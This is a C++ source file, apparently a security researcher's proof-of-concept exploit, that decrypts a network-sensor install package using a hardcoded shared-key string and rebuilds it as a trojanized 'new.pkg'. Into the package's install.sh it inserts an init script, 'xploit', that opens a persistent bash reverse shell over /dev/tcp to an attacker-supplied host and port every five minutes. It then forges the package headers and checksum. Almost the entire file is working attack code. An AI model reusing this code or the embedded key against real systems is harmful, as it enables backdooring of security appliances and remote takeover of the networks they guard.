#include "popl.hpp"
#include <random>
#include <cstdlib>
#include <iostream>
#include <unistd.h>
#include <filesystem>

#include "picosha2.hpp"
#include "plusaes.hpp"

namespace
{
    void banner()
    {
        std::cout << "   __      __  __               __    __" << std::endl;
        std::cout << "  /\\ \\  __/\\ \\/\\ \\             /\\ \\__/\\ \\" << std::endl;          
        std::cout << "  \\ \\ \\/\\ \\ \\ \\ \\ \\___      __ \\ \\ ,_\\ \\/ ____" << std::endl;
        std::cout << "   \\ \\ \\ \\ \\ \\ \\ \\  _ `\\  /'__`\\\\ \\ \\/\\/ /',__\\" << std::endl; 
        std::cout << "    \\ \\ \\_/ \\_\\ \\ \\ \\ \\ \\/\\ \\L\\.\\\\ \\ \\_ /\\__, `\\" << std::endl;
        std::cout << "     \\ `\\___x___/\\ \\_\\ \\_\\ \\__/.\\_\\ \\__\\\\/\\____/" << std::endl;
        std::cout << "      '\\/__//__/  \\/_/\\/_/\\/__/\\/_/\\/__/ \\/___/" << std::endl; 
        std::cout << "   __  __" << std::endl;
        std::cout << "  /\\ \\/\\ \\" << std::endl;
        std::cout << "  \\ \\ \\ \\ \\  _____            jbaines-r7" << std::endl;
        std::cout << "   \\ \\ \\ \\ \\/\\ '__`\\              🦞" << std::endl;
        std::cout << "    \\ \\ \\_\\ \\ \\ \\L\\ \\      \"What's going on?\"" << std::endl;
        std::cout << "     \\ \\_____\\ \\ ,__/" << std::endl;
        std::cout << "      \\/_____/\\ \\ \\/" << std::endl;
        std::cout << "               \\ \\_\\" << std::endl;
        std::cout << "                \\/_/" << std::endl;
        std::cout << std::endl;  
    }

    bool verify_magic(const std::string& p_file)
    {
        std::ifstream inputFile(p_file, std::ifstream::in | std::ifstream::binary);
        if (!inputFile.is_open() || !inputFile.good())
        {
            std::cerr << "[-] Failed to open the provided file: " << p_file << std::endl;
            return false;
        }

        uint16_t magic = 0;
        inputFile.read(reinterpret_cast<char*>(&magic), 2);
        inputFile.close();
        if (magic != 0xc5c0)
        {
            std::cout << "[-] Invalid file. Expected magic bytes of 0xc0c5." << std::endl;
            return false;
        }
        return true;
    }

    void write_file(const std::string& p_output, const std::string& p_file)
    {
        std::ofstream out(p_file, std::ios::trunc);
        out.write(p_output.data(), p_output.size());
        out.close();      
    }

    void write_file(const std::vector<unsigned char>& p_output, const std::string& p_file)
    {
        std::ofstream out(p_file, std::ios::trunc);
        out.write(reinterpret_cast<const char*>(p_output.data()), p_output.size());
        out.close();      
    }

    bool parse_files(const std::string& p_file)
    {
        std::ifstream inputFile(p_file, std::ifstream::in | std::ifstream::binary);
        if (!inputFile.is_open() || !inputFile.good())
        {
            std::cerr << "[-] Failed to open the provided file: " << p_file << std::endl;
            return false;
        }

        inputFile.seekg(18);
        char type = 0;
        inputFile.read(&type, 1);
        if (type != 0x03)
        {
            std::cerr << "[-] Expected key header" << std::endl;
            return false;
        }

        // skip over name and length
        inputFile.seekg(34);
        std::vector<unsigned char> encrypted_key;
        encrypted_key.resize(32, 0);
        inputFile.read(reinterpret_cast<char*>(&encrypted_key[0]), 32);
        write_file(encrypted_key, "tmp/encrypted_key");

        // jump to the encrypted archive section
        inputFile.seekg(882);
        inputFile.read(&type, 1);
        if (type != 0x05)
        {
            std::cerr << "[-] Expected encrypted archive header" << std::endl;
            return false;
        }

        // we only need the iv from the metadata
        inputFile.seekg(906);
        std::vector<unsigned char> iv;
        iv.resize(16, 0);
        inputFile.read(reinterpret_cast<char*>(&iv[0]), 16);
        write_file(iv, "tmp/iv");
        inputFile.close();
        
        // all of the above could have been done like this too but the error checking is nice.
        system(std::string("tail -c +979 " + p_file + " > tmp/archive.tgz.enc").c_str());
        system("truncate --size=-272 tmp/archive.tgz.enc");
        
        return true;
    }

    std::string load_file(const std::string& p_file)
    {
        std::ifstream inputFile(p_file, std::ifstream::in | std::ifstream::binary);
        if (!inputFile.is_open() || !inputFile.good())
        {
            std::cerr << "[-] Failed to open the provided file: " << p_file << std::endl;
            return std::string();
        }

        std::string input((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
        inputFile.close();
        return input;
    }

    bool decrypt_archive()
    {
        std::cout << "[+] Extracting decryption materials" << std::endl;
        if (!parse_files("tmp/tmp.pkg"))
        {
            return false;
        }

        std::cout << "[+] Attempting to decrypt the package... this might take 10ish minutes (and a lot of memory, sorry!)" << std::endl;

        // compute the shared key
        std::string src_str = "R4o0x~8d|4=Jh^%P)Kqf6d5e.v#^%#(&(;kuwtUTR-WQp%^#86";
        std::vector<unsigned char> shared_key(picosha2::k_digest_size);
        picosha2::hash256(src_str.begin(), src_str.end(), shared_key.begin(), shared_key.end());

        // use the shared key to decrypt the package key
        std::string encrypted_key(load_file("tmp/encrypted_key"));
        std::vector<unsigned char> decrypted_key(encrypted_key.size());
        unsigned char iv[16] = {
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        };
        plusaes::decrypt_cbc(reinterpret_cast<unsigned char*>(&encrypted_key[0]), encrypted_key.size(), &shared_key[0], shared_key.size(), &iv, &decrypted_key[0], decrypted_key.size(), NULL);

        // decrypt the archive
        std::string iv_file(load_file("tmp/iv"));
        memcpy(iv, iv_file.data(), 16);

        // we about to bloooow through memory
        {
            std::string tgz_encrypted(load_file("tmp/archive.tgz.enc"));
            std::vector<unsigned char> tgz_decrypted(tgz_encrypted.size());
            plusaes::decrypt_cbc(reinterpret_cast<unsigned char*>(&tgz_encrypted[0]), tgz_encrypted.size(), &decrypted_key[0], decrypted_key.size(), &iv, &tgz_decrypted[0], tgz_decrypted.size(), NULL);

            write_file(tgz_decrypted, "tmp/tmp.tgz");
        }

        // verify the result has the BZ magic
        std::ifstream inputFile("tmp/tmp.tgz", std::ifstream::in | std::ifstream::binary);
        if (!inputFile.is_open() || !inputFile.good())
        {
            std::cerr << "[-] Failed to open the tmp/tmp.tgz" << std::endl;
            return false;
        }

        uint16_t magic = 0;
        inputFile.read(reinterpret_cast<char*>(&magic), 2);
        inputFile.close();
        if (magic != 0x5a42)
        {
            std::cout << "[-] Failed decryption. Expected magic bytes of 0x5a42." << std::endl;
            return false;
        }

        std::cout << "[+] Successful decryption! Cleaning up extra files" << std::endl;
        system("rm -rf tmp/iv tmp/archive.tgz.enc tmp/encrypted_key tmp/tmp.pkg");
        return true;
    }

    bool findAndReplace(std::string& p_haystack, const std::string& p_needle, const std::string& p_replacement)
    {
        std::size_t pos = p_haystack.find(p_needle);
        if (pos != std::string::npos)
        {
            p_haystack.replace(pos, p_needle.size(), p_replacement);
            return true;
        }
        return false;
    }

    const std::string replace_me(
        "if [ \"$DO_AIDE\" = \"false\" ] ; then\n" \
        "    umount_disk\n" \
        "fi\n" \
        "\n" \
        "exit 0");

    std::string create_exploit(const std::string& p_addr, int p_port)
    {
        std::string port(std::to_string(p_port));
        std::string ret_val(
            "cat << EOF > ${MOUNTPOINT}/etc/rc.d/init.d/xploit\n" \
            "#!/bin/sh\n" \
            "\n" \
            "source /etc/rc.d/init.d/functions\n" \
            "PATH=\"/usr/local/bin:/usr/bin:/bin:/usr/local/sf/bin:/sbin:/usr/sbin\"\n" \
            "\n" \
            "xploit_start() {\n"
            "  (while true; do sleep 300 && /bin/bash -i >& /dev/tcp/");
        ret_val.append(p_addr);
        ret_val.append("/");
        ret_val.append(port);
        ret_val.append(" 0>&1; done) &\n" \
            "}\n" \
            "\n" \
            "case \"\\$1\" in\n" \
            "'start')\n" \
            "  xploit_start\n" \
            "  ;;\n" \
            "*)\n" \
            "  echo \"usage $0 start|stop|restart\"\n" \
            "esac\n" \
            "EOF\n" \
            "\n" \
            "ln -s ../init.d/xploit ${MOUNTPOINT}/etc/rc.d/rc3.d/S31xploit\n" \
            "chmod +x ${MOUNTPOINT}/etc/rc.d/init.d/xploit\n" \
            "\n" \
            "\n" \
            "if [ \"$DO_AIDE\" = \"false\" ] ; then\n" \
            "    umount_disk\n" \
            "fi\n" \
            "\n" \
            "exit 0");
        return ret_val;
    }
}

int main(int p_argc, char** p_argv)
{
    banner();

    popl::OptionParser op("Allowed options");
    auto help_option = op.add<popl::Switch>("h", "help", "produce help message");
    auto input_option = op.add<popl::Value<std::string>, popl::Attribute::required>("i", "input", "The unsigned package to manipulate");
    auto lhost_option = op.add<popl::Value<std::string>, popl::Attribute::required>("", "lhost", "The host to connect back");
    auto lport_option = op.add<popl::Value<int>, popl::Attribute::required>("", "lport", "The port to connect back to");

    try
    {
        op.parse(p_argc, p_argv);
    }
    catch (std::exception& e)
    {
        std::cout << e.what() << std::endl;
        std::cout << op << std::endl;
        return EXIT_FAILURE;
    }

    std::cout << "[+] User provided package: " << input_option->value() << std::endl;
    if (!verify_magic(input_option->value()))
    {
        return EXIT_FAILURE;
    }

    std::cout << "[+] Copying the provided file to ./tmp" << std::endl;
    system(std::string("mkdir tmp; cp " + input_option->value() + " tmp/tmp.pkg").c_str());

    if (!decrypt_archive())
    {
        return EXIT_FAILURE;
    }

    std::cout << "[+] Unpacking..." << std::endl;

    // unpackage the big tar.gz
    system("tar -xvf tmp/tmp.tgz -C tmp/");

    // unpackage the inner tar.gz
    system("tar -xvf tmp/data/elektra_sensor_64-bit-restore.tgz -C tmp/data/");

    // remove the restore.tgz
    system("rm tmp/data/elektra_sensor_64-bit-restore.tgz");

    std::cout << "[+] Inserting a reverse shell into install.sh" << std::endl;
    std::string install_sh = load_file("tmp/data/install/install.sh");
    if (install_sh.empty())
    {
        std::cout << "[-] Failed to open install.sh. Did unpacking fail?" << std::endl;
        return EXIT_FAILURE;
    }

    std::string xploit(create_exploit(lhost_option->value(), lport_option->value()));
    if (!findAndReplace(install_sh, replace_me, xploit))
    {
        std::cerr << "[-] Couldn't find the overwrite point in install.sh" << std::endl;
        return EXIT_FAILURE;
    }
    write_file(install_sh, "tmp/data/install/install.sh");

    std::cout << "[+] Compressing elektra_sensor_64-bit-restore.tgz" << std::endl;
    system("cd tmp/data; tar -czvf elektra_sensor_64-bit-restore.tgz archive-ramdisk.tar.gz install packages");
    system("rm -rf ./tmp/data/install/ ./tmp/data/packages/ ./tmp/data/archive-ramdisk.tar.gz");
    system("cd tmp; tar -cf archive.tar ./data/ elektra_install.py setup.conf setup.py setup_util.py");

    std::cout << "[+] Generating the data archive" << std::endl;
    system("cd tmp; bzip2 -z archive.tar");

    std::cout << "[+] Creating new.pkg..." << std::endl;
    std::ifstream inputFile("tmp/archive.tar.bz2", std::ifstream::in | std::ifstream::binary);
    if (!inputFile.is_open() || !inputFile.good())
    {
        std::cerr << "Failed to ropen the provided file: " << input_option->value() << std::endl;
        return EXIT_FAILURE;
    }
    inputFile.ignore(std::numeric_limits<std::streamsize>::max());
    uint32_t length = static_cast<uint32_t>(inputFile.gcount());
    inputFile.clear();
    inputFile.seekg(0, std::ios_base::beg);

    std::cout << "[+] Writing file and section headers" << std::endl;
    std::ofstream header("new.pkg");
    header.write("\xc0\xc5", 2);
    header.write("\x00\x00\x00\x05", 4);
    header.write("\x00\x00\x02\x74", 4);
    header.write("ignoreit", 8);
    header.write("\x01", 1);
    header.write("data\x00\x00\x00\x00\x00\x00\x00", 11);
    header.write(reinterpret_cast<const char*>(&length), 4);
    header.close();

    std::cout << "[+] Appending the compressed archive" << std::endl;
    system("cat tmp/archive.tar.bz2 >> new.pkg");

    std::cout << "[+] Appending the checksum section" << std::endl;
    std::ofstream trailer("new.pkg", std::ios_base::app);
    trailer.write("\x02", 1);
    trailer.write("checksum\x00\x00\x00", 11);
    trailer.write("\x28\x00\x00\x00", 4);
    trailer.close();

    system("sha1sum tmp/archive.tar.bz2 | grep -o '^[^ ]*' >> new.pkg");
    system("rm -rf tmp/");

    std::cout << "[+] Completed new.pkg" << std::endl;

    return EXIT_FAILURE;
}